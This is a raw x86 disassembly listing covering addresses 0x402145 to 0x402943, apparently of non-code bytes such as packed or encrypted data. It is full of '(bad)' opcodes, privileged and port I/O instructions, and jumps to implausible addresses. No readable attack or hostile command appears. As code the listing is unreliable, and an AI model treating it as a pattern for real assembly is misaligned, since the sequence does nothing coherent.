  402145:	pop    edx
  402146:	js     0x402151
  402148:	cmp    eax,0xdc167908
  40214d:	inc    ebx
  40214e:	mov    ds:0xf6196fdc,al
  402153:	cmp    DWORD PTR [esi+0x24],esi
  402156:	mov    dl,0xf8
  402158:	mov    esi,0x2e5d4d78
  40215d:	addr16 ret 
  40215f:	adc    eax,0xec7c588a
  402164:	and    eax,0x442ce4ff
  402169:	in     eax,dx
  40216a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40216b:	outs   dx,BYTE PTR ds:[esi]
  40216c:	xor    al,0x3f
  40216e:	adc    eax,0x572538dc
  402173:	outs   dx,DWORD PTR ds:[esi]
  402174:	jge    0x402190
  402176:	inc    ecx
  402177:	push   ecx
  402178:	popa   
  402179:	add    BYTE PTR [ebp-0x3dafb028],dl
  40217f:	out    dx,al
  402180:	in     eax,dx
  402181:	push   ebp
  402182:	pop    es
  402183:	int3   
  402184:	mov    eax,0x961e5914
  402189:	fs xchg edi,eax
  40218b:	cmp    bh,BYTE PTR [esi-0x6b636524]
  402191:	jge    0x4021a5
  402193:	gs push esp
  402195:	popf   
  402196:	in     eax,dx
  402197:	mov    ebx,ecx
  402199:	sub    BYTE PTR [edx+0x7],bh
  40219c:	mov    bh,0x51
  40219e:	pop    edi
  40219f:	gs pusha 
  4021a1:	sti    
  4021a2:	jne    0x40214e
  4021a4:	push   edi
  4021a5:	shl    dl,cl
  4021a7:	outs   dx,BYTE PTR ds:[esi]
  4021a8:	sub    eax,0xa95ad628
  4021ad:	sub    BYTE PTR [edx-0x68],bl
  4021b0:	cmp    BYTE PTR [edi+0x4c],ch
  4021b3:	push   ds
  4021b4:	xchg   edx,eax
  4021b5:	sti    
  4021b6:	clc    
  4021b7:	cmp    al,0x84
  4021b9:	pop    ebx
  4021ba:	xchg   esp,eax
  4021bb:	icebp  
  4021bc:	push   edi
  4021bd:	lock bound edx,QWORD PTR [esi-0x13ab730c]
  4021c4:	pop    ebp
  4021c5:	icebp  
  4021c6:	push   edi
  4021c7:	pop    ecx
  4021c8:	hlt    
  4021c9:	fwait
  4021ca:	stos   DWORD PTR es:[di],eax
  4021cc:	mov    ds:0x446beb83,al
  4021d1:	push   0xffffffdf
  4021d3:	and    al,0x54
  4021d6:	data16 je 0x4021a4
  4021d9:	inc    ecx
  4021da:	cmp    DWORD PTR ds:0x6aa082cd,ebp
  4021e0:	cmp    al,0xa5
  4021e2:	adc    edi,DWORD PTR es:[edi]
  4021e5:	xor    esi,DWORD PTR ds:0xaee0aebf
  4021eb:	xor    ah,BYTE PTR [ecx-0x2bbe3e25]
  4021f1:	loopne 0x4021eb
  4021f3:	cmp    al,0x2b
  4021f5:	sbb    al,0x98
  4021f7:	outs   dx,DWORD PTR ds:[esi]
  4021f8:	unpcklps xmm2,XMMWORD PTR [edx+0xe]
  4021fc:	and    ch,ch
  4021fe:	jbe    0x4021db
  402200:	clc    
  402201:	xor    bl,BYTE PTR [esi-0x49c831ad]
  402207:	test   eax,0xec42f133
  40220c:	mov    ds:0x6a20c18a,eax
  402211:	rol    BYTE PTR [ecx-0x4f],cl
  402214:	call   0xef81a462
  402219:	lock mov dl,0x8d
  40221c:	or     DWORD PTR [edx-0x552834c0],eax
  402222:	in     eax,dx
  402223:	das    
  402224:	icebp  
  402225:	lods   al,BYTE PTR ds:[esi]
  402226:	mov    bl,0x6f
  402228:	ins    BYTE PTR es:[edi],dx
  402229:	pop    ebx
  40222a:	int    0x42
  40222c:	pop    ecx
  40222d:	das    
  40222e:	adc    eax,0x8df2a269
  402233:	inc    edi
  402234:	lds    ebx,FWORD PTR [ebp+0x624362e1]
  40223a:	or     DWORD PTR [ebx+0x60],ebx
  40223d:	(bad)  
  40223e:	ins    DWORD PTR es:[edi],dx
  40223f:	iret   
  402240:	jg     0x402217
  402242:	fistp  QWORD PTR [edi-0x72]
  402245:	sbb    ebx,DWORD PTR [edx+0x680b26a7]
  40224b:	adc    BYTE PTR [edx+0x50832762],ah
  402251:	fstp   DWORD PTR [ebx-0x7ad5a93]
  402257:	in     al,dx
  402258:	cwde   
  402259:	push   esp
  40225a:	sub    dh,BYTE PTR [edx-0x65]
  40225d:	xchg   BYTE PTR [edx+eax*4+0x56cb6c33],dh
  402264:	or     DWORD PTR [ebx+0x2612b08b],ebp
  40226a:	imul   ebx,DWORD PTR [eax+0x11],0x67
  40226e:	shl    BYTE PTR [ebp-0x80],cl
  402271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402272:	pop    edi
  402273:	mov    ds:0xa5fbfc6b,al
  402278:	loopne 0x4022ab
  40227a:	pop    esp
  40227b:	not    DWORD PTR [ebp-0x1f]
  40227e:	mov    al,cs:0xb4b86bc3
  402284:	das    
  402285:	sahf   
  402286:	mov    bh,0xd
  402288:	xor    BYTE PTR [esi+0x545fb7bc],0x37
  40228f:	(bad)  
  402291:	add    al,0x66
  402293:	push   0x30a1f1a5
  402298:	pop    ss
  402299:	les    esi,FWORD PTR [ebx]
  40229b:	mov    ?,WORD PTR [ebp-0x286ef556]
  4022a1:	xchg   BYTE PTR [esi],ah
  4022a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022a4:	push   edx
  4022a5:	sub    al,0x37
  4022a7:	adc    ebx,esi
  4022a9:	das    
  4022aa:	daa    
  4022ab:	mul    edi
  4022ad:	mov    ebx,0xf023c7f7
  4022b2:	cmc    
  4022b3:	mov    eax,ds:0xb06d97fb
  4022b8:	jg     0x402281
  4022ba:	je     0x40232e
  4022bc:	scas   eax,DWORD PTR es:[edi]
  4022bd:	cs stos DWORD PTR es:[edi],eax
  4022bf:	xchg   esi,eax
  4022c0:	dec    ebx
  4022c1:	sub    eax,0x5372fdbc
  4022c6:	jo     0x402340
  4022c8:	(bad)  
  4022c9:	or     al,0xbc
  4022cb:	rcl    DWORD PTR [edx-0xfc71e12],0x3d
  4022d2:	mov    ds:0xaba45fbf,eax
  4022d7:	scas   eax,DWORD PTR es:[edi]
  4022d8:	cmc    
  4022d9:	in     eax,0x67
  4022db:	stos   DWORD PTR es:[edi],eax
  4022dc:	scas   al,BYTE PTR es:[edi]
  4022dd:	(bad)  
  4022de:	(bad)  
  4022df:	cli    
  4022e0:	addr16 mov ds:0xdea,al
  4022e4:	loop   0x4022ff
  4022e6:	xchg   ebp,eax
  4022e7:	sub    al,0x95
  4022e9:	mov    ebx,0xe99f0fc6
  4022ee:	sub    BYTE PTR [ecx-0x48388b19],0x93
  4022f5:	bound  esp,QWORD PTR [esp+ebp*2]
  4022f8:	cmc    
  4022f9:	iret   
  4022fa:	push   ss
  4022fb:	mov    edx,0x47eefeb4
  402300:	adc    ah,BYTE PTR [edx]
  402302:	test   eax,0x88689ba1
  402307:	pop    edi
  402308:	push   esi
  402309:	fcomp  DWORD PTR [eax-0x5a8186dd]
  40230f:	mov    eax,0x1e966afa
  402314:	inc    esp
  402315:	imul   ecx,DWORD PTR [eax+0x4bb830be],0x1a
  40231c:	sbb    ebx,DWORD PTR [eax+0x200f4f39]
  402322:	mov    esp,0xad0b4da2
  402327:	aaa    
  402328:	cmp    esi,edx
  40232a:	icebp  
  40232b:	mov    cl,0x57
  40232d:	enter  0x24e9,0x72
  402331:	rcr    BYTE PTR [ecx+0x3f1bf2ba],1
  402337:	or     DWORD PTR [edi],eax
  402339:	aaa    
  40233a:	jbe    0x402359
  40233c:	inc    edx
  40233d:	retf   0xe900
  402340:	jle    0x40239b
  402342:	push   0x1eabb90e
  402347:	push   esi
  402348:	dec    edx
  402349:	mov    ecx,0x9e59e93a
  40234e:	or     eax,0xb53444e6
  402353:	add    eax,0xb6011cd2
  402358:	dec    ebp
  402359:	sub    eax,0x3c69a4bf
  40235e:	xchg   ebp,eax
  40235f:	cwde   
  402360:	(bad)  
  402361:	icebp  
  402362:	call   0x373:0x9f1dc37c
  402369:	pusha  
  40236a:	test   eax,0x5dbee1a6
  40236f:	and    BYTE PTR [ebx],bl
  402371:	add    ch,cl
  402373:	add    cl,dl
  402375:	arpl   cx,ax
  402377:	push   esp
  402378:	or     DWORD PTR [edx],ebx
  40237a:	push   0xffffffb3
  40237c:	jne    0x4023bb
  40237e:	mov    ebx,0xa0d53d13
  402383:	dec    eax
  402384:	xchg   edx,eax
  402385:	gs or  al,0xe6
  402388:	int3   
  402389:	div    DWORD PTR [edx]
  40238b:	or     eax,DWORD PTR ds:0x58377087
  402391:	test   DWORD PTR [ecx-0xa6f0bd6],ecx
  402397:	repnz es pop ds
  40239a:	jl     0x40234a
  40239c:	xor    al,0x7c
  40239e:	scas   eax,DWORD PTR es:[edi]
  40239f:	jnp    0x402336
  4023a1:	pop    edx
  4023a2:	xchg   esi,eax
  4023a3:	cli    
  4023a4:	add    BYTE PTR [edx+0x70f26285],ah
  4023aa:	push   ebp
  4023ab:	xchg   edi,eax
  4023ac:	xchg   edi,eax
  4023ad:	fstp   TBYTE PTR [ebp-0x70]
  4023b0:	pop    ds
  4023b1:	pop    ds
  4023b2:	xlat   BYTE PTR ds:[ebx]
  4023b3:	jmp    0x6b8ee4e9
  4023b8:	mov    edx,0x97e99688
  4023bd:	repz dec ebx
  4023bf:	stc    
  4023c0:	xor    DWORD PTR [edi+0x58],ebx
  4023c3:	or     al,0x39
  4023c5:	mov    esi,fs
  4023c7:	xchg   ecx,eax
  4023c8:	sub    BYTE PTR [ebx-0x58364d97],dh
  4023ce:	or     esi,DWORD PTR [ebx]
  4023d0:	and    eax,0x3ca32b31
  4023d5:	into   
  4023d6:	out    0x47,al
  4023d8:	cmp    ecx,ecx
  4023da:	test   BYTE PTR [ebx],cl
  4023dc:	mov    edx,0xfa9c6196
  4023e1:	ror    BYTE PTR [ebp-0x7f],cl
  4023e4:	iret   
  4023e5:	mov    al,ds:0x1c9d9de2
  4023ea:	ret    0x5eb1
  4023ed:	es push ss
  4023ef:	jns    0x402451
  4023f1:	fist   WORD PTR [edx-0x16]
  4023f4:	fs iret 
  4023f6:	push   0x6bbf620
  4023fb:	ss scas eax,DWORD PTR es:[edi]
  4023fd:	xor    ecx,DWORD PTR [edi+0x34]
  402400:	add    eax,0x73965226
  402405:	rcr    BYTE PTR [eax-0x2a17620],0xab
  40240c:	mov    al,ds:0xc37d172f
  402411:	fmul   st,st(1)
  402413:	shl    dh,0xf1
  402416:	mov    esi,0x69b40dbb
  40241b:	sub    al,0xe7
  40241d:	(bad)  [edi+eax*1-0x52]
  402421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402422:	xor    al,0x78
  402424:	mov    dh,BYTE PTR [ebp-0x5a]
  402427:	pop    esp
  402428:	dec    esp
  402429:	pop    ebx
  40242a:	test   DWORD PTR [edx-0x74db80cf],edi
  402430:	sbb    bl,al
  402432:	fisub  DWORD PTR [edi-0x42]
  402435:	push   edi
  402436:	aad    0x4d
  402438:	xchg   esi,eax
  402439:	mov    dh,0x5e
  40243b:	inc    ebp
  40243c:	fwait
  40243d:	and    DWORD PTR [eax],edx
  40243f:	or     dh,0xdc
  402442:	dec    eax
  402443:	and    eax,0x1ab029e9
  402448:	inc    eax
  402449:	ret    
  40244a:	lods   eax,DWORD PTR ds:[esi]
  40244b:	adc    BYTE PTR [edi+0x4b],dl
  40244e:	gs pusha 
  402450:	mov    ebx,0x97bff61e
  402455:	jecxz  0x40240a
  402457:	push   ss
  402458:	retf   
  402459:	push   ds
  40245a:	iret   
  40245b:	jg     0x40246d
  40245d:	and    cl,cl
  40245f:	pop    ss
  402460:	mov    al,ds:0xe5f8be74
  402465:	inc    esp
  402466:	sub    edi,esp
  402468:	push   ss
  402469:	clts   
  40246b:	in     al,0xf
  40246d:	sar    DWORD PTR [esi],1
  40246f:	add    esi,ebp
  402471:	repz mov bl,0x13
  402474:	call   DWORD PTR [edi-0x14a3d3b4]
  40247a:	je     0x4024db
  40247c:	dec    eax
  40247d:	and    ecx,DWORD PTR [edx+0x2b]
  402480:	push   eax
  402481:	pushf  
  402482:	cmp    al,0x32
  402484:	cdq    
  402485:	xchg   edx,eax
  402486:	xor    edx,eax
  402488:	sar    DWORD PTR [edx+0x36],1
  40248b:	inc    ecx
  40248c:	stos   DWORD PTR es:[edi],eax
  40248d:	fsub   DWORD PTR [eax-0x60]
  402490:	imul   DWORD PTR [edx]
  402492:	retf   0xb748
  402495:	cmp    dl,dh
  402497:	and    eax,0x2b43fd63
  40249c:	test   al,0x46
  40249e:	ins    BYTE PTR es:[edi],dx
  40249f:	and    ecx,ebp
  4024a1:	jg     0x40244f
  4024a3:	ror    BYTE PTR [ebx],0x7d
  4024a6:	shr    DWORD PTR [ebx],1
  4024a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024a9:	frstor [esi+ebp*4]
  4024ac:	test   eax,0x9a49448d
  4024b1:	hlt    
  4024b2:	aaa    
  4024b3:	rol    DWORD PTR [eax-0x1b3685fa],0xae
  4024ba:	shl    dh,0x4c
  4024bd:	push   0x24
  4024bf:	int    0xd0
  4024c1:	jp     0x40253f
  4024c3:	fwait
  4024c4:	dec    ecx
  4024c5:	or     esi,DWORD PTR [esi]
  4024c7:	ret    
  4024c8:	stos   BYTE PTR es:[edi],al
  4024c9:	daa    
  4024ca:	ret    
  4024cb:	daa    
  4024cc:	repnz push 0x3a
  4024cf:	xor    eax,DWORD PTR [edi-0x7]
  4024d2:	inc    ecx
  4024d3:	ja     0x40246f
  4024d5:	aaa    
  4024d6:	and    cl,BYTE PTR [ebp-0x6c]
  4024d9:	mov    edi,?
  4024db:	sti    
  4024dc:	sti    
  4024dd:	xlat   BYTE PTR ds:[ebx]
  4024de:	scas   al,BYTE PTR es:[edi]
  4024df:	popf   
  4024e0:	sbb    al,0x79
  4024e2:	sub    al,0x79
  4024e4:	lods   eax,DWORD PTR ds:[esi]
  4024e5:	shl    BYTE PTR [esi+0x64],1
  4024e8:	jns    0x402532
  4024ea:	shl    DWORD PTR [ecx*1-0x463bbc79],1
  4024f1:	pop    ebx
  4024f2:	mov    fs,ebp
  4024f4:	sub    eax,0x13744876
  4024f9:	push   es
  4024fa:	in     al,dx
  4024fb:	pop    edx
  4024fc:	mov    al,0xc
  4024fe:	adc    ecx,ebx
  402500:	out    dx,al
  402501:	push   ecx
  402502:	pop    esi
  402503:	sub    esi,ecx
  402505:	loopne 0x402546
  402507:	dec    edx
  402508:	rol    BYTE PTR [ebx-0x154e60d1],cl
  40250e:	and    cl,BYTE PTR [edi-0x27]
  402511:	mov    esi,0xc094986a
  402516:	fdivr  QWORD PTR [ecx+esi*1+0x4f25f611]
  40251d:	leave  
  40251e:	ret    0x116a
  402521:	and    BYTE PTR [bp+si-0x3e],cl
  402525:	pop    esi
  402526:	(bad)  
  402527:	cmc    
  402528:	and    BYTE PTR [eax+0x49],ch
  40252b:	push   0x2643e3f
  402530:	test   ah,ch
  402532:	inc    ebx
  402533:	test   BYTE PTR [ecx],cl
  402535:	push   ecx
  402536:	and    eax,0xef9ab802
  40253b:	(bad)  
  40253c:	mov    eax,ds:0x7dbc34b0
  402541:	or     eax,edi
  402543:	jae    0x40253e
  402545:	ret    
  402546:	xor    ebx,ebx
  402548:	mov    DWORD PTR [esi-0x35],esp
  40254b:	lahf   
  40254c:	jae    0x4024e8
  40254e:	fcom   QWORD PTR [eax+eiz*1-0x74]
  402552:	adc    BYTE PTR [eax+edi*8],ah
  402555:	xchg   ecx,eax
  402556:	(bad)  
  402557:	jmp    0x4024e0
  402559:	jb     0x4025d9
  40255b:	and    ebp,ebp
  40255d:	and    BYTE PTR [esi+0x9dbdb01],cl
  402563:	mov    esi,0x845b3fc6
  402568:	test   BYTE PTR [edx+eiz*2+0x74],ch
  40256c:	and    eax,0xf3772d13
  402571:	xor    esi,DWORD PTR [esp+edx*1-0x1472b540]
  402578:	arpl   WORD PTR [edx+0x68],si
  40257b:	popf   
  40257c:	iret   
  40257d:	int    0x82
  40257f:	adc    cl,bh
  402581:	mov    esi,0x11fa38cf
  402586:	bound  ebx,QWORD PTR [ecx+eax*2]
  402589:	ins    DWORD PTR es:[edi],dx
  40258a:	jae    0x402558
  40258c:	test   ebx,edx
  40258e:	dec    eax
  40258f:	jb     0x40255a
  402591:	inc    esp
  402592:	mov    edx,0x73650b32
  402597:	mov    esp,0x5e9e5a7c
  40259c:	and    DWORD PTR [ebx+0x25],edi
  40259f:	lahf   
  4025a0:	lods   eax,DWORD PTR ds:[esi]
  4025a1:	and    DWORD PTR ds:0x8a0893ba,esi
  4025a7:	cmp    eax,0xe9f121d0
  4025ac:	add    eax,0x5e716f0c
  4025b1:	call   0xafd7b990
  4025b6:	mov    ebx,0x17a4a539
  4025bb:	rcr    ebx,1
  4025bd:	or     BYTE PTR [ecx+0x52],bl
  4025c0:	sub    DWORD PTR [ecx],ecx
  4025c2:	arpl   WORD PTR [edx-0x5a],di
  4025c5:	xchg   edi,eax
  4025c6:	mov    ah,0xad
  4025c8:	retf   0xe0
  4025cb:	sub    DWORD PTR ds:0x388939dc,esp
  4025d1:	idiv   DWORD PTR [esi+0x56bdf9f0]
  4025d7:	or     al,0xca
  4025d9:	sbb    DWORD PTR [edx+0x580b77a1],eax
  4025df:	enter  0x485a,0xc7
  4025e3:	mov    ds:0x779e5e6e,al
  4025e8:	pop    es
  4025e9:	xchg   BYTE PTR [ebx+0x9],ch
  4025ec:	ins    BYTE PTR es:[edi],dx
  4025ed:	dec    edi
  4025ee:	jno    0x4025bb
  4025f0:	inc    ecx
  4025f1:	ss pop eax
  4025f3:	repnz inc edi
  4025f5:	push   eax
  4025f6:	and    eax,ebx
  4025f8:	dec    edx
  4025f9:	adc    cl,BYTE PTR [esi-0x6e]
  4025fc:	mov    ah,0x37
  4025fe:	sub    DWORD PTR [esi],eax
  402600:	cmp    DWORD PTR [eax+0x2a1ab191],esp
  402606:	mov    BYTE PTR [edi+eax*8],dl
  402609:	(bad)  
  40260a:	sub    ebx,ebx
  40260c:	xchg   esp,eax
  40260d:	inc    edi
  40260e:	in     al,0x14
  402610:	jmp    0xbed0:0xa8d8bc44
  402617:	nop
  402618:	aam    0x82
  40261a:	js     0x4025c3
  40261c:	fwait
  40261d:	ins    BYTE PTR es:[edi],dx
  40261e:	xor    eax,0xf0e12b8
  402623:	and    al,0xd
  402625:	imul   edi,esp,0x9355d721
  40262b:	jmp    0x1bd3:0x9182197f
  402632:	mov    dh,0xa0
  402634:	cmp    ecx,DWORD PTR [edi]
  402636:	mov    DWORD PTR [esi],0xb73bcf5f
  40263c:	xor    bl,cl
  40263e:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  402640:	hlt    
  402641:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402643:	lahf   
  402644:	add    BYTE PTR [eax],0xed
  402647:	push   ebp
  402648:	jno    0x40269d
  40264a:	(bad)  
  40264b:	jg     0x402616
  40264d:	(bad)  [edx-0x6d8435ce]
  402653:	jae    0x4026a2
  402655:	xor    eax,0x8f6b549d
  40265a:	inc    edx
  40265b:	call   0x7ea2898b
  402660:	nop
  402661:	ins    DWORD PTR es:[edi],dx
  402662:	push   edx
  402663:	mov    bl,0x8c
  402665:	xor    eax,0xbdf91496
  40266a:	stos   BYTE PTR es:[edi],al
  40266b:	pop    eax
  40266c:	sbb    eax,0xec4a9ee5
  402671:	icebp  
  402672:	fsubr  QWORD PTR [esi+0x6c]
  402675:	xor    DWORD PTR [ebx-0x7b347e84],edi
  40267b:	add    eax,0x9fb56a81
  402680:	mov    dh,0x9f
  402682:	cmp    DWORD PTR [eax],0x7c
  402685:	inc    ebp
  402686:	sbb    eax,0x4d9cfd99
  40268b:	mov    ecx,0x84eb09c7
  402690:	popa   
  402691:	into   
  402692:	sbb    dh,ah
  402694:	cdq    
  402695:	fild   QWORD PTR ds:0xe04b019
  40269b:	mov    ebp,0x91e16b5c
  4026a0:	jno    0x4026d7
  4026a2:	xor    BYTE PTR [esi+0x233f59d],dh
  4026a8:	and    ch,al
  4026aa:	fld    TBYTE PTR [ecx+0x73d9756d]
  4026b0:	jmp    0xc5d87464
  4026b5:	inc    esp
  4026b6:	call   FWORD PTR [ebx+0x11028a7c]
  4026bc:	adc    dh,dl
  4026be:	push   0xffffffcb
  4026c0:	jle    0x402673
  4026c2:	sub    eax,0xc45cce8d
  4026c7:	adc    al,0x89
  4026c9:	int3   
  4026ca:	cmovbe esi,DWORD PTR [ebx+0x265014d1]
  4026d1:	cdq    
  4026d2:	test   DWORD PTR [eax+0x4650f067],edi
  4026d8:	inc    esp
  4026d9:	ja     0x40269d
  4026db:	jl     0x4026d3
  4026dd:	mov    dh,0xc5
  4026df:	jno    0x402731
  4026e1:	dec    eax
  4026e2:	xchg   BYTE PTR [ebx],bl
  4026e4:	in     eax,dx
  4026e5:	out    0xf8,eax
  4026e7:	cmp    esp,0xab5970b7
  4026ed:	mov    al,ds:0x9b3dcc33
  4026f2:	push   0x6a842dc6
  4026f7:	adc    ebp,DWORD PTR [esp+ebx*2]
  4026fa:	jp     0x40273b
  4026fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026fd:	sbb    ah,BYTE PTR [eax-0x235f8a3d]
  402703:	fnstcw WORD PTR [ebx+esi*8]
  402706:	pop    ecx
  402707:	lock mov ecx,0x5d286ab1
  40270d:	mov    ebx,0xaa005487
  402712:	push   ebp
  402713:	sbb    esi,DWORD PTR [edx]
  402715:	stc    
  402716:	push   ebx
  402717:	stos   DWORD PTR es:[edi],eax
  402718:	jb     0x4026df
  40271a:	lahf   
  40271b:	call   esp
  40271d:	xchg   esi,eax
  40271e:	cwd    
  402720:	inc    edx
  402721:	aad    0xde
  402723:	adc    ah,bh
  402725:	sub    dh,BYTE PTR [eax+0x4a40f8fa]
  40272b:	mov    eax,ds:0xae58d063
  402730:	adc    bh,cl
  402732:	popf   
  402733:	int    0xb1
  402735:	rcr    DWORD PTR [ecx+0x6eb72417],0x64
  40273c:	xor    DWORD PTR [edx],esp
  40273e:	mov    cs,WORD PTR [ebp-0x62b4b9a5]
  402744:	push   esp
  402745:	adc    bl,cl
  402747:	sub    BYTE PTR [ebp+eax*4-0x39018ccd],al
  40274e:	sbb    al,ch
  402750:	stc    
  402751:	retf   0x53f6
  402754:	sbb    BYTE PTR [edi+0x4b6892c0],bh
  40275a:	inc    esi
  40275b:	pop    edi
  40275c:	mov    cl,0xe2
  40275e:	data16 fs xchg bl,dl
  402762:	ins    BYTE PTR es:[edi],dx
  402763:	cmp    BYTE PTR [edx],al
  402765:	gs das 
  402767:	loop   0x4027be
  402769:	outs   dx,BYTE PTR ds:[esi]
  40276a:	xchg   ecx,eax
  40276b:	(bad)  
  40276d:	dec    ebp
  40276e:	push   es
  40276f:	imul   edi,eax,0x8cb76562
  402775:	push   edx
  402776:	sbb    al,0x96
  402778:	jno    0x4027d3
  40277a:	push   ebx
  40277b:	dec    edi
  40277c:	or     eax,0xaf24f5a0
  402781:	mov    ds:0xfaee63e5,eax
  402786:	cmp    ch,ah
  402788:	xor    eax,0xfec8b1bc
  40278d:	mov    esi,0xa43636
  402792:	int3   
  402793:	mov    esp,0x8a70d27c
  402798:	fstp   QWORD PTR [eax-0x13]
  40279b:	add    al,0x87
  40279d:	imul   eax,DWORD PTR [ecx],0x4f
  4027a0:	mov    edi,0xcd39dafd
  4027a5:	fsubr  QWORD PTR [edi-0x11]
  4027a8:	rcr    BYTE PTR [ecx+0x1719f794],0xc0
  4027af:	cmp    eax,0x5ff7f074
  4027b4:	xor    eax,DWORD PTR [eax-0xa]
  4027b7:	pop    edi
  4027b8:	inc    esp
  4027b9:	retf   
  4027ba:	pop    ds
  4027bb:	mov    bh,0x65
  4027bd:	sub    esi,edx
  4027bf:	add    al,0x12
  4027c1:	ins    BYTE PTR es:[edi],dx
  4027c2:	scas   eax,DWORD PTR es:[edi]
  4027c3:	push   0x50
  4027c5:	neg    ebp
  4027c7:	clc    
  4027c8:	cmc    
  4027c9:	xchg   edx,eax
  4027ca:	loopne 0x4027f9
  4027cc:	pop    ebp
  4027cd:	sub    eax,DWORD PTR [edx-0x16]
  4027d0:	and    ah,bl
  4027d2:	fidiv  DWORD PTR [esi+0x27e84f1a]
  4027d8:	outs   dx,BYTE PTR ds:[esi]
  4027d9:	dec    ebp
  4027da:	inc    ebp
  4027db:	imul   BYTE PTR [esi+0x17]
  4027de:	inc    esp
  4027df:	mov    ds:0xd18bd622,eax
  4027e4:	pop    esp
  4027e5:	iret   
  4027e6:	ret    
  4027e7:	les    edx,FWORD PTR [ecx-0x589e8a53]
  4027ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027ee:	pop    ds
  4027ef:	(bad)  
  4027f0:	aam    0xf
  4027f2:	int3   
  4027f3:	inc    esp
  4027f4:	jp     0x402811
  4027f6:	jle    0x40279a
  4027f8:	pop    ecx
  4027f9:	adc    cl,BYTE PTR [edx+0x2c81a220]
  4027ff:	rcl    BYTE PTR [edi+0x27ff5de5],1
  402805:	xor    BYTE PTR [edx],dl
  402807:	outs   dx,BYTE PTR ds:[esi]
  402808:	imul   esp,DWORD PTR [ebp+0x28a8d195],0x48
  40280f:	xor    esi,ecx
  402811:	bnd jmp 0x402880
  402814:	lods   al,BYTE PTR ds:[esi]
  402815:	adc    al,0x2e
  402817:	mov    eax,DWORD PTR [edx-0x2d]
  40281a:	dec    ecx
  40281b:	mov    ebx,0xbf3efe11
  402820:	jge    0x402850
  402822:	call   0x4c56:0xab913250
  402829:	pop    eax
  40282a:	test   al,0xed
  40282c:	or     DWORD PTR [esi],0x445fd9f6
  402832:	push   ss
  402833:	ret    0xf301
  402836:	jne    0x402899
  402838:	test   ebx,eax
  40283a:	outs   dx,DWORD PTR ds:[esi]
  40283b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40283c:	xchg   ebp,eax
  40283d:	es aas 
  40283f:	and    edx,ebx
  402841:	xchg   DWORD PTR [ecx-0x5245bd24],esp
  402847:	push   ecx
  402848:	(bad)  
  402849:	or     al,0xbb
  40284b:	(bad)  
  40284c:	jmp    0x8f41:0xceb081b0
  402853:	dec    esi
  402854:	pop    esi
  402855:	cmp    BYTE PTR [eax-0x3e],dl
  402858:	jbe    0x40282c
  40285a:	gs hlt 
  40285c:	test   al,0x1a
  40285e:	sub    al,0xf8
  402860:	in     al,dx
  402861:	es repz popa 
  402864:	test   DWORD PTR [ecx+0x2a],ecx
  402867:	push   cs
  402868:	pop    ebx
  40286a:	imul   edx,DWORD PTR [eax+0x36],0xffffffda
  40286e:	fdivr  st,st(1)
  402870:	call   0xc6c37e59
  402875:	and    DWORD PTR [esi],0x7543612f
  40287b:	(bad)  
  40287c:	cwde   
  40287d:	fld    QWORD PTR [edi-0x528b4fd9]
  402883:	(bad)  
  402885:	add    BYTE PTR ds:0x454ac824,al
  40288b:	cmp    al,0x7
  40288d:	push   ecx
  40288e:	sbb    BYTE PTR [edi-0x7d54e07b],0x95
  402895:	(bad)  
  402896:	mov    al,bh
  402898:	sbb    ebp,0xffffffb5
  40289b:	xor    eax,0x6bed1cd2
  4028a0:	ins    BYTE PTR es:[edi],dx
  4028a1:	xor    DWORD PTR [eax-0x17],ebx
  4028a4:	inc    edi
  4028a5:	xchg   BYTE PTR [ebx-0x7d232730],ch
  4028ab:	stos   BYTE PTR es:[edi],al
  4028ac:	sahf   
  4028ad:	stos   BYTE PTR es:[edi],al
  4028ae:	xor    ebx,DWORD PTR [edx+0x74e50666]
  4028b4:	leave  
  4028b5:	cli    
  4028b6:	cmp    eax,0xc84e976f
  4028bb:	sub    ebx,DWORD PTR [ecx+0x34]
  4028be:	xchg   ecx,eax
  4028bf:	sar    cl,1
  4028c1:	mov    edi,0x7b706b0b
  4028c6:	scas   al,BYTE PTR es:[edi]
  4028c7:	or     ch,BYTE PTR [ebx]
  4028c9:	add    DWORD PTR [edx],edx
  4028cb:	ja     0x402881
  4028cd:	fwait
  4028ce:	mov    fs,esi
  4028d0:	pop    esp
  4028d1:	xor    al,0x8c
  4028d3:	(bad)  
  4028d4:	cld    
  4028d5:	push   es
  4028d6:	mov    eax,0xd6ccc8a0
  4028db:	mov    WORD PTR [edx],fs
  4028dd:	mov    ds:0x1d632016,al
  4028e2:	adc    BYTE PTR [edx],bl
  4028e4:	push   ss
  4028e5:	mov    esi,0x5713cef0
  4028ea:	mov    ebp,0x46852eaf
  4028ef:	pop    esi
  4028f0:	adc    al,al
  4028f2:	out    dx,eax
  4028f3:	xchg   ecx,eax
  4028f4:	cli    
  4028f5:	add    edx,DWORD PTR [ecx]
  4028f7:	retf   0x3ccc
  4028fa:	lahf   
  4028fb:	int    0xe4
  4028fd:	rcl    DWORD PTR [esi-0x2b],cl
  402900:	sbb    BYTE PTR [ebp-0x5],dl
  402903:	adc    DWORD PTR [esi+0x6d],edi
  402906:	xchg   ecx,eax
  402907:	cmp    ebx,DWORD PTR [edx+0x2b]
  40290a:	mov    esp,0x6e6a60c4
  40290f:	(bad)  
  402910:	std    
  402911:	(bad)  
  402912:	loopne 0x4028ec
  402914:	sub    al,0xb2
  402916:	stos   DWORD PTR es:[edi],eax
  402917:	or     eax,0xadbfff7c
  40291c:	ret    0xc4c5
  40291f:	mov    bl,BYTE PTR [eax-0x1a]
  402922:	ds dec esp
  402924:	push   edi
  402925:	retf   0xfb64
  402928:	mov    ds:0xd25256bf,eax
  40292d:	aaa    
  40292e:	aaa    
  40292f:	movd   DWORD PTR [edx-0x17],mm2
  402933:	dec    edx
  402934:	dec    esp
  402935:	out    dx,al
  402936:	mov    bh,0x89
  402938:	or     eax,0x18a68395
  40293d:	lds    eax,FWORD PTR [eax+0x5c]
  402940:	xlat   BYTE PTR ds:[ebx]
  402941:	xchg   ebp,eax
  402942:	xchg   ebp,eax
  402943:	sub    al,0xa8
